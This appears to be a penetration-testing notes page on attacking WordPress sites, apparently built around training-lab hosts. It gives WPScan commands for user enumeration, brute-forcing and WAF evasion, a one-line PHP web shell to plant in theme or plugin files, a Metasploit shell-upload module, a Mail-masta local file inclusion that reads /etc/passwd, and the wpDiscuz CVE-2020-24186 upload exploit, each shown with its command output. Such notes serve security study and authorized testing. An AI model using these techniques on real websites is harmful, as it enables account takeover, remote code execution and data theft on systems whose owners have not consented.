---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# WordPress

## General Information

{% hint style="info" %}
[WordPress Vulnerability Statistics](https://wpscan.com/statistics/)
{% endhint %}

<details>

<summary>Directories</summary>

`/wp-admin` -> `/wp-login.php`

`/wp-content/plugins/`

`/wp-content/themes/`

</details>

<details>

<summary>Wordlists</summary>

[wordpress.fuzz.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/wordpress.fuzz.txt)

[wp-plugins.fuzz.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt)

[wp-themes.fuzz.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/wp-themes.fuzz.txt)

</details>

<details>

<summary>Roles &#x26; Permissions</summary>

Administrator -> King :crown:

Editor -> Post management + publish (for all users)

Author -> Post management + publish (owned posts)

Contributor -> Post management (owned posts)

Subscriber -> Browse posts, manage its own profile

</details>

## Automated Enumeration (WPScan)

{% hint style="info" %}
For vulnerability scanning get a token from [WPScan](https://wpscan.com/).
{% endhint %}

[WPScan](https://github.com/wpscanteam/wpscan/wiki/WPScan-User-Documentation) is a free, Ruby-based WordPress security scanner that performs black-box testing to identify vulnerabilities in WordPress core, plugins, themes, and user configurations.

{% tabs %}
{% tab title="Update DB" %}
```bash
wpscan --update
```
{% endtab %}

{% tab title="Vulnerable Components" %}
```bash
sudo wpscan --url example.com --enumerate --api-token <TOKEN>
```
{% endtab %}

{% tab title="Brute-force" %}
WPScan uses 2 kinds of BFA:

1. [xmlrpc](https://kinsta.com/blog/xmlrpc-php/) → uses WP's API to BF (`xmlrpc.php`) (faster)
2. wp-login → attempts to BF `wp-login.php`&#x20;

{% hint style="warning" %}
`wp-login.php` is the standard login form that accepts one login attempt per request. `xmlrpc.php` allows login via API calls and can bundle many attempts in one request, making brute-force faster.

\
Even if `wpscan` outputs that XML-RPC is enabled, login-related methods may be blocked by plugins or server settings, so attacks through it can fail while `wp-login` attacks still work.
{% endhint %}

{% code overflow="wrap" %}
```bash
# Enumerating users and brute-forcing
sudo wpscan --url example.com -e u --passwords password.lst

# Targeted brute-forcing using xmlrpc
sudo wpscan --password-attack xmlrpc -t 20 --url http://example.com -U roger -P /usr/share/wordlists/rockyou
```
{% endcode %}
{% endtab %}

{% tab title="WAF Evasion" %}
{% code overflow="wrap" %}
```bash
sudo wpscan --url example.com --enumerate --api-token <TOKEN> --random-user-agent
```
{% endcode %}
{% endtab %}
{% endtabs %}

## Manual Enumeration

{% tabs %}
{% tab title="Version" %}
```bash
curl -s example.com | grep '<meta name="generator"'
```
{% endtab %}

{% tab title="Themes" %}
```bash
curl -s example.com | grep themes
```
{% endtab %}

{% tab title="Plugins" %}
```bash
curl -s example.com | grep plugins
```
{% endtab %}

{% tab title="Plugin Version" %}
Plugin version requires Directory listing to be enabled:

{% code overflow="wrap" %}
```bash
curl -s example.com/wp-content/plugins/mail-masta/readme.txt | grep "Stable tag:"
```
{% endcode %}
{% endtab %}
{% endtabs %}

## RCE

### Browser

A simple PHP web shell (obfuscate the file name).&#x20;

```php
<?php system($_GET['c']); ?>
```

Modify a less-used file of an inactive theme for avoiding breaking the site.

{% hint style="success" %}
The same exact method can be done with Plugins:

![](../../../.gitbook/assets/wp_rce_2.png)\
\
Remeber to activate the plugin after: _Plugins_ → _Installed Plugins_ → _Activate_.
{% endhint %}

<figure><img src="../../../.gitbook/assets/http_80_ir_webshell_process.png" alt=""><figcaption><p>Step for RCE after gaining admin access.</p></figcaption></figure>

Interact with the shell via CLI.

```bash
curl http://example.com/wp-content/themes/twentytwenty/404.php?c=id
```

### Metasploit

```bash
# launch metasploit
msfconsole -q
# use module (make sure to `set VHOST`)
msf6 > use exploit/unix/webapp/wp_admin_shell_upload
```

## Vulnerabilities

### Mail-masta

No longer supported:

* [unauthenticated SQL injection](https://www.exploit-db.com/exploits/41438)
* [Local File Inclusion](https://www.exploit-db.com/exploits/50226).

{% code overflow="wrap" %}
```php
<?php 

include($_GET['pl']); # no validation/sanitization
global $wpdb;

$camp_id=$_POST['camp_id'];
$masta_reports = $wpdb->prefix . "masta_reports";
$count=$wpdb->get_results("SELECT count(*) co from  $masta_reports where camp_id=$camp_id and status=1");

echo $count[0]->co;

?>
```
{% endcode %}

{% code overflow="wrap" %}
```shell
$ curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...snip...
```
{% endcode %}

### wpDiscuz

`wpDiscuz` is a plugin aimed to enhance commenting on page posts. Based on the version number (`7.0.4`), this [exploit](https://www.exploit-db.com/exploits/49967) has a pretty good shot of getting us command execution via a file upload bypass.

`wpDiscuz` is intended only to allow image attachments. The file mime type functions could be bypassed, allowing an unauthenticated attacker to upload a malicious PHP file and gain remote code execution. The exploit script takes two parameters: `-u` the URL and `-p` the path to a valid post:

{% code overflow="wrap" %}
```bash
$ python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1

---------------------------------------------------------------
[-] Wordpress Plugin wpDiscuz 7.0.4 - Remote Code Execution
[-] File Upload Bypass Vulnerability - PHP Webshell Upload
[-] CVE: CVE-2020-24186
[-] https://github.com/hevox
--------------------------------------------------------------- 

[+] Response length:[102476] | code:[200]
[!] Got wmuSecurity value: 5c9398fcdb
[!] Got wmuSecurity value: 1 

[+] Generating random name for Webshell...
[!] Generated webshell name: uthsdkbywoxeebg

[!] Trying to Upload Webshell..
[+] Upload Success... Webshell path:url&quot;:&quot;http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php&quot; 

> id

[x] Failed to execute PHP code...
```
{% endcode %}

The exploit as written may fail, but we can use curl to interact with the uploaded webshell:

{% code overflow="wrap" %}
```bash
$ curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id

GIF689a;

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
{% endcode %}
